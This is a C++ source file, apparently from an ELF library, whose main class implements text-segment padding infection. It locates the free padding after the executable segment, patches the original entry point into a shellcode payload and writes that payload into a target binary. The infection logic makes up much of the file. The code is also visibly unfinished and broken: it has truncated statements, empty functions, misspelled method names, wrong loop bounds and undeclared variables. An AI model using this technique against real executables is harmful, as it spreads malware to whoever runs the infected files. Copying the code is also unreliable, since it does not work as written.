#include "zkelf.hh"

int Binary::PatchAddress(u8 *buffer, size_t len, u8 *addr, u8 *magic)
{
    for(int i = 0; i < len; i++){
        if(buffer[i] == magic[0] && buffer[i + 1] == magic[1]){
            for(int j = 0; j < ADDR_LEN && i < len; j++, i++){
                buffer[i] = addr[j];
            }
            return 0;
        }
    }
    std::cerr << "keyword not found\n";
    return -1;
}

Binary::Elf::Elf()
    :elf_memmap(nullptr), elf_pathname(nullptr), elf_baseaddr(0), 
    elf_ehdr(nullptr), elf_phdr(nullptr), elf_shdr(nullptr), elf_size(0), elf
{}

Binary::Elf::Elf(const char *pathname)
    :elf_memmap(nullptr), elf_pathname(pathname), elf_baseaddr(0),
    elf_ehdr(nullptr), elf_phdr(nullptr), elf_shdr(nullptr), elf_size(0) 
{
    try{
        OpenElf();
        LoadFile();
    } catch (std::exception& e) {
        std::cerr << e.what();
        try{
            RemoveMap();
        } catch (std::exception& e){
            goto err;
        }
err:
        std::abort();
    }
}

Binary::Elf::~Elf()
{
    try{
        RemoveMap();
    } catch(std::exception& e){
        std::cout << e.what();
        std::abort();
    }

}

void Binary::Elf::OpenElf(void)
{
    assert(elf_pathname != nullptr && "pathname is not specified");

    elf_fd = open(elf_pathname, O_RDONLY);
    if(elf_fd < 0)
        ERROR(std::runtime_error("open failed\n"));

    struct stat st;
    if(fstat(elf_fd, &st) < 0)
        ERROR(std::runtime_error("fstat failed\n"));

    elf_size = st.st_size;
}

void Binary::Elf::LoadFile(void)
{
    assert(elf_fd != 0 && "file descriptor is empty");

    elf_memmap = mmap(elf_memmap, elf_size, PROT_READ | PROT_WRITE, 
            MAP_PRIVATE, elf_fd, 0);
    if(elf_memmap == MAP_FAILED)
        ERROR(std::runtime_error("mmap failed\n"));

    elf_ehdr = (Ehdr *)elf_memmap;
    assert(VerifyElf() != false && "File is not an Elf binary");

    u8 *m = (u8 *)elf_ehdr;
    elf_phdr = (Phdr *)&m[elf_ehdr->e_phoff];
    elf_shdr = (Shdr *)&m[elf_ehdr->e_shoff];

    /* symbol table and string table */
    int symtab_index = GetSectionIndexByName(".symtab");
    if
}

bool Binary::Elf::VerifyElf(void) const
{
    if(elf_ehdr->e_ident[0] != 0x7f || elf_ehdr->e_ident[1] != 'E' ||
            elf_ehdr->e_ident[2] != 'L' || elf_ehdr->e_ident[4] != 'F')
    {
        return false;
    }
    return true;
}

u16 Binary::Elf::GetElfType(void) const
{
    return elf_ehdr->e_type;
}

void Binary::Elf::RemoveMap(void)
{
    assert(elf_memmap != nullptr && "memory is not mapped to unmap");
    if(munmap(elf_memmap, elf_size) < 0)
        ERROR(std::runtime_error("munmap failed"));

    elf_memmap = nullptr;
}

int Binary::Elf::GetegmentbyAttr(u32 type, u32 flags) const
{
    for(int i = 0; i < elf_ehdr->e_phnum; i++){
        if(elf_phdr[i].p_type == type && elf_phdr[i].p_flags == flags){
            return i;
        }
    }
        
    return -1;
}

int Binary::Elf::GetSectionbyAttr(u32 type, u32 flags) const
{

}

/* duh you cant get a segment by name */

int Binary::Elf::GetSectionIndexbyName(const char *name) const
{
    char *memmap = (char *)elf_memmap;
    char *shstrtab = &memmap[elf_shdr[elf_ehdr->e_shstrndx].sh_offset];
    for(int i = 0; i< elf_ehdr->e_shnum; i++){
        if(strcmp(&shstrtab[elf_shdr[i].sh_name], name) == 0){
            return i;
        }
    }
    return -1;
}

int Binary::Elf::GetSymbolbyName(const char *name) const
{

}

void *Binary::Elf::ElfRead(off_t readoff, size_t size) const
{
    u8 *buffer = (u8 *)calloc(size, sizeof(u8));
    if(buffer == nullptr)
        ERROR(std::bad_alloc());

    u8 *memmap = (u8 *)elf_memmap;
    for(int i = readoff; i < readoff + size; i++){
        buffer[i] = memmap[i];
    }
    return buffer;
}

void Binary::Elf::ElfWrite(void *buffer, off_t writeoff, size_t size)
 const
{
    u8 *memmap = (u8 *)elf_memmap;
    u8 *_buffer = (u8 *)buffer;
    for(int i = 0; i < writeoff + size; i++){
        _buffer[i] = memmap[i];
    }
}

Binary::TextPaddingInfection::TextPaddingInfection(const char *target)
    :Elf(target), tpi_payload(nullptr), tpi_fake_entry(0), 
    tpi_payload_sz(0)
{
    char buf[ADDR_LEN];
    sprintf(buf, "%lx", elf_ehdr->e_entry);
    for(int i = 0; i < ADDR_LEN; i++){
        if(buf[i] >= 0x61 && buf[i] <= 0x66)
            tpi_org_entry[i] = buf[i] - 87;
        else if(buf[i] >= 0x30 && buf[i] <= 0x39)
            tpi_org_entry[i] = buf[i] - 48;
        else
            ERROR(std::runtime_error("original entry point is weird\n"));
    }
}

Binary::TextPaddingInfection::~TextPaddingInfection()
{
    if(tpi_payload)
        free(tpi_payload);
}

/* assumed payload is a heap allocated memory chunk */
void Binary::TextPaddingInfection::SetPayload(u8 *payload, size_t
        payload_sz)
{
    /* total size of shellcode should be payload_sz - MAGIC_LEN + ADDR_LEN
     */
    tpi_payload_sz = payload_sz - MAGIC_LEN + ADDR_LEN;
    tpi_payload = realloc(payload, tpi_payload_sz * (sizeof(u8)));
    if(tpi_payload == nullptr)
        ERROR(std::bad_alloc());
}

off_t Binary::TextPaddingInfection::FindFreeSpace(void)
{
    /* text segment has permission bits set to read and exec */
    int text_index = GetSegmentbyAttr(PT_LOAD, PF_X | PF_R);
    assert(text_index != -1 && "text segment not found");

    /* data segment has permission bits set to read and write */
    int data_index = GetSegmentbyAttr(PT_LOAD, PF_W | PF_R);
    assert(data_index != -1 && "data segment not found");

    assert(text_index + 1 == data_index);
    int available_space = elf_phdr[data_index].p_offset - 
        elf_phdr[text_index].p_offset;
    assert(available_space >= tpi_payload_sz && "available free space   \
            is less than size");
    tpi_fake_entry = elf_phdr[text_index].p_vaddr + elf_phdr[text_index]
        .p_memsz;
    return elf_phdr[text_index].p_offset + elf_phdr[text_index].
        p_filesz;
}

int Binary::TextPaddingInfection::InjectPayload(off_t writeoff, size_t
    size) const
{
    if(PatchAddress(tpi_payload, tpi_payload_sz, tpi_org_entry, 
        tpi_magic) < 0){
        std::cerr << "injection failed\n";
        return;
    }

    ElfWrite(tpi_shellcode, writeoff, size);

}